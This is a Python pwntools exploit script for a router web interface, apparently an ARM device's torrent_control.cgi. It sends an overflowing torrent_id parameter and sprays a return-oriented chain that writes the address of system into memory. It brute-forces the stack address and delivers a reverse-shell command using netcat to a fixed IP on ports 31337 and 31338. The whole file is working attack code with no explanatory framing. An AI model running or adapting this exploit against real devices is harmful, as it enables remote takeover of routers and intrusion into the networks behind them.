#!/usr/bin/python3

from pwn import *
import random

e = ELF("torrent_control.cgi")

addr_abort      = e.plt['abort']
addr_ret        = 0x00012198
addr_fcall_init = 0x000158b8
addr_fcall_loop = 0x0001589c
addr_system     = 0x00013a78

def purl32(value):

    a = (value & 0x000000ff) >> 0
    b = (value & 0x0000ff00) >> 8
    c = (value & 0x00ff0000) >> 16
    d = (value & 0xff000000) >> 24

    return "%{:02x}%{:02x}%{:02x}%{:02x}".format(a,b,c,d)

def form_packet(param, ip, cookie, content=''):
    
    packet  = ""
    packet += "POST http://{}/cgi/advanced/torrent_control.cgi?{} HTTP/1.1\r\n".format(ip, param)
    packet += "Host: {}\r\n".format(ip)
    packet += "Connection: keep-alive\r\n"
    packet += "Content-Length: {}\r\n".format(len(content))
    packet += "User-Agent: {}\r\n".format('Mozilla/5.0')
    packet += "Accept: */*\r\n"
    packet += "Origin: http://{}\r\n".format(ip)
    packet += "Referer: http://{}/home.cgi\r\n".format(ip)
    packet += "Accept-Encoding: gzip, deflate\r\n"
    packet += "Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n"
    packet += "Cookie: {}\r\n".format(cookie)
    packet += "\r\n"

    return packet.encode()

def form_param(payload, additional=''):

    param  = "sh=sh&act=remove&"
    param += "torrent_id=" + payload
    if (additional):
        param += "&" + additional

    return param

def form_cookie(session_id):
    return "efm_session_id={}".format(session_id)
    

def spray(): # 0x1500

    ret  = ""

    ''' Spray return sled. '''
    ret += purl32(addr_ret) * (0x1500-1-(8*6))
    
    ''' ... '''
    ret += purl32(addr_fcall_init)

    ''' ... '''
    addr = e.plt['system2']

    ret += purl32(0x00000000)                               # r3
    ret += purl32(0x00000000)                               # r4
    ret += purl32(e.got['memset']-4)                        # r5
    ret += purl32(e.bss(0x140))                             # r6 -> r0
    ret += purl32((addr & 0x000000ff) >> 0x00)              # r7 -> r1
    ret += purl32(0x00000001)                               # r8 -> r2
    ret += purl32(0x00000000)                               # r10
    ret += purl32(addr_fcall_loop)                          # lr

    ret += purl32(0x00000000)                               # r3
    ret += purl32(0x00000000)                               # r4
    ret += purl32(e.got['memset']-4)                        # r5
    ret += purl32(e.bss(0x141))                             # r6 -> r0
    ret += purl32((addr & 0x0000ff00) >> 0x08)              # r7 -> r1
    ret += purl32(0x00000001)                               # r8 -> r2
    ret += purl32(0x00000000)                               # r10
    ret += purl32(addr_fcall_loop)                          # lr

    ret += purl32(0x00000000)                               # r3
    ret += purl32(0x00000000)                               # r4
    ret += purl32(e.got['memset']-4)                        # r5
    ret += purl32(e.bss(0x142))                             # r6 -> r0
    ret += purl32((addr & 0x00ff0000) >> 0x10)              # r7 -> r1
    ret += purl32(0x00000001)                               # r8 -> r2
    ret += purl32(0x00000000)                               # r10
    ret += purl32(addr_fcall_loop)                          # lr

    ret += purl32(0x00000000)                               # r3
    ret += purl32(0x00000000)                               # r4
    ret += purl32(e.got['memset']-4)                        # r5
    ret += purl32(e.bss(0x143))                             # r6 -> r0
    ret += purl32((addr & 0xff000000) >> 0x18)              # r7 -> r1
    ret += purl32(0x00000001)                               # r8 -> r2
    ret += purl32(0x00000000)                               # r10
    ret += purl32(addr_fcall_loop)                          # lr

    ''' ... '''
    ret += purl32(0x00000000)                               # r3
    ret += purl32(0x00000000)                               # r4
    ret += purl32(e.got['get_get_raw_data']-4)              # r5
    ret += purl32(0x00000000)                               # r6 -> r0
    ret += purl32(0x00000000)                               # r7 -> r1
    ret += purl32(0x00000000)                               # r8 -> r2
    ret += purl32(0x00000000)                               # r10
    ret += purl32(addr_fcall_loop)                          # lr

    ''' ... '''
    ret += purl32(0x00000000)                               # r3
    ret += purl32(0x00000000)                               # r4
    ret += purl32(e.bss(0x140)-4)                           # r5
    ret += purl32(0x00000000)                               # r6 -> xx
    ret += purl32(0x00000000)                               # r7 -> r1
    ret += purl32(0x00000000)                               # r8 -> r2
    ret += purl32(0x00000000)                               # r10
    ret += purl32(addr_fcall_loop+4)

    return "a=" + ret

def packall(ip, session_id, payload, post):

    param  = form_param(payload, additional=spray())
    cookie = form_cookie(session_id)
    packet = form_packet(param, ip, cookie, post)

    return packet

def exploit(ip, session_id):

    try:
        while True:

            ''' ... '''
            stack = 0xbe000590 | (random.randint(0x800, 0xe00) << 12)
            payload  = "A"*236
            payload += purl32(stack)        # Stack
            payload += purl32(0x0001184c)   # ESP Modification

            ''' ... '''
            post = "/bin/sh -c '/tmp/nc 172.16.11.172 31337 | /bin/sh | /tmp/nc 172.16.11.172 31338' &\n"

            ''' ... '''
            packet = packall(ip, session_id, payload, post)

            ''' ... '''
            p = remote(ip, 80)
            p.send(packet)
            p.send(post.encode() + b"\r\n")
            p.send(post.encode())
            r = p.recv(timeout=3).decode()
            p.close()

            sleep(0)

            ''' ... '''
            if (len(r) == 279) or (len(r) == 100):
                continue

            log.info(hexdump(r))
            log.info("Gotcha! stack is 0x%08x", stack)
            return

    except:
        log.info("Error.")

def debug(session_id):

    payload  = "A"*236
    payload += purl32(0xbeab051e) # Stack
    payload += purl32(0x0001184c) # ESP Modification

    param  = form_param(payload, additional=spray())
    cookie = form_cookie(session_id)
    packet = form_packet(param, "0.0.0.0", cookie, "ABCD")

    with open("debug_form.sh", 'rb') as f:
        form = f.read().decode()

    form = form.format(param,
                       cookie)

    with open("debug.sh", 'wb') as f:
        f.write(form.encode())

    log.info("Done.")

if __name__ == "__main__":
    
    context.clear(arch='arm')

    if (len(sys.argv) != 3):
        print("{} [ip] [session id]".format(sys.argv[0]))
    elif (sys.argv[1] == "debug"):
        debug(sys.argv[2])
    else:
        exploit(sys.argv[1], sys.argv[2])
